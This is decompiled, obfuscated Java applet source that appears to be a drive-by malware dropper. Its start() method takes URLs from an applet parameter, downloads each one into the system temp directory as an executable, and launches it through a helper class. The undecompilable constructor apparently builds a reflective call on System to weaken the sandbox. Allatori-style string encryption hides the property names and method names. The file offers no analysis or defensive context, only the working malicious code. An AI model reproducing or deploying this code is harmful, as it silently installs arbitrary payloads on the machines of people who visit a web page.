import java.io.FileOutputStream;
import java.util.HashSet;
import java.net.URL;
import java.io.InputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class asa extends Applet
{
    public JList yutyrs;
    
    public asa() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     0: aload_0         /* a */
        //     1: invokespecial   java/applet/Applet.<init>:()V
        //     4: new             Ljava/lang/StringBuffer;
        //     7: dup            
        //     8: ldc             "\u0014\\D"
        //    10: invokestatic    jyqqqqq.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    13: invokespecial   java/lang/StringBuffer.<init>:(Ljava/lang/String;)V
        //    16: ldc             "\u0016U\u0011"
        //    18: invokestatic    asa.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    21: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    24: ldc             "\u000e(h\u0017X\u0007"
        //    26: invokestatic    jyqqqqq.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    29: iconst_2       
        //    30: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //    33: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    36: ldc             "B\fD\u001c"
        //    38: invokestatic    asa.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    41: ldc             "\bC\bFt?"
        //    43: invokestatic    jyqqqqq.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    46: iconst_5       
        //    47: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //    50: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //    53: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    56: ldc             "\t{\u0004^\u0004"
        //    58: invokestatic    asa.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    61: iconst_2       
        //    62: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //    65: ldc             "\u0015^\u0000"
        //    67: invokestatic    jyqqqqq.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    70: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //    73: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //    76: iconst_3       
        //    77: invokevirtual   java/lang/StringBuffer.substring:(I)Ljava/lang/String;
        //    80: astore_1       
        //    81: new             Lfftubny;
        //    84: dup            
        //    85: ldc             Ljava/lang/System;.class
        //    87: aload_1        
        //    88: iconst_1       
        //    89: anewarray       Ljava/lang/Object;
        //    92: iconst_1       
        //    93: dup            
        //    94: pop2           
        //    95: invokespecial   fftubny.<init>:(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)V
        //    98: astore_1       
        //    99: aload_0         /* a */
        //   100: invokevirtual   asa.y5rfcxs:()Ljava/util/HashSet;
        //   103: dup            
        //   104: astore_2       
        //   105: aload_1        
        //   106: invokevirtual   java/util/HashSet.add:(Ljava/lang/Object;)Z
        //   109: new             Le;
        //   112: dup            
        //   113: aload_0         /* a */
        //   114: aload_2        
        //   115: invokespecial   e.<init>:(Lasa;Ljava/util/HashSet;)V
        //   118: astore_1       
        //   119: pop            
        //   120: new             Ljavax/swing/JList;
        //   123: aload_0         /* a */
        //   124: dup_x1         
        //   125: dup            
        //   126: pop2           
        //   127: dup            
        //   128: iconst_1       
        //   129: anewarray       Ljava/lang/Object;
        //   132: iconst_1       
        //   133: dup            
        //   134: pop2           
        //   135: dup            
        //   136: iconst_0       
        //   137: aload_1        
        //   138: aastore        
        //   139: invokespecial   javax/swing/JList.<init>:([Ljava/lang/Object;)V
        //   142: putfield        asa.yutyrs:Ljavax/swing/JList;
        //   145: aload_0         /* a */
        //   146: dup            
        //   147: getfield        asa.yutyrs:Ljavax/swing/JList;
        //   150: invokevirtual   asa.add:(Ljava/awt/Component;)Ljava/awt/Component;
        //   153: pop            
        //   154: return         
        //    LocalVariableTable:
        //  Start  Length  Slot  Name  Signature
        //  -----  ------  ----  ----  ---------
        //  0      155     0     a     Lasa;
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:324)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:153)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformCall(AstMethodBodyBuilder.java:1120)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:1010)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformNode(AstMethodBodyBuilder.java:392)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformBlock(AstMethodBodyBuilder.java:333)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:294)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:757)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:692)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:529)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:499)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:141)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:130)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:105)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:317)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:238)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:138)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = (0x3 ^ 0x5) << 4 ^ 0x5;
        final int n2 = (0x3 ^ 0x5) << 3;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    public InputStream kay(String a2) {
        try {
            a2 = (String)new URL(a2);
            final String a3 = "Z\u0004F\u0004\u001e\u000bU\u0011\u001e0b)";
            ((URL)a2).openConnection();
            return (InputStream)Class.forName(ALLATORI_DEMO(a3)).getMethod(jyqqqqq.ALLATORI_DEMO("T\u0002^\u001ch\u0006I\u0017Z\u001f"), (Class<?>[])new Class[0]).invoke(a2, new Object[0]);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    public HashSet y5rfcxs() {
        return new HashSet();
    }
    
    public FileOutputStream bra(final String a2) {
        try {
            return new FileOutputStream(a2);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter(ALLATORI_DEMO("\u0010B\t")).split(jyqqqqq.ALLATORI_DEMO("S\u0018Q"));
            String s2;
            final String s = s2 = System.getProperty(ALLATORI_DEMO("Z\u0004F\u0004\u001e\f_KD\b@\u0001Y\u0017"));
            if (s.charAt(s.length() - 1) != '\\') {
                s2 = new StringBuilder().insert(0, s2).append(jyqqqqq.ALLATORI_DEMO(".")).toString();
            }
            Integer n2;
            Integer n3;
            Integer n4;
            for (Integer n = n2 = 0; n < split.length && split[n2].length() != 0; n2 = (n3 = n2) + 1, n4 = n3, n = n2) {
                final String string = new StringBuilder().insert(0, s2).append(ALLATORI_DEMO("]\u0016")).append(n2).append(new StringBuilder().insert(0, ALLATORI_DEMO("T\u0016Q\u0016]KU\u001d").substring(5)).append(jyqqqqq.ALLATORI_DEMO("\u0017")).toString()).toString();
                final InputStream kay = this.kay(split[n2]);
                final FileOutputStream bra = this.bra(string);
                final byte[] array = new byte[1024];
                InputStream inputStream = kay;
                int read;
                while ((read = inputStream.read(array, 0, array.length)) != -1) {
                    inputStream = kay;
                    bra.write(array, 0, read);
                }
                kay.close();
                bra.close();
                new yum().main(string);
            }
            this.kay(new StringBuilder().insert(0, split[n2 - 1]).append("").toString()).close();
        }
        catch (Exception ex) {}
    }
}
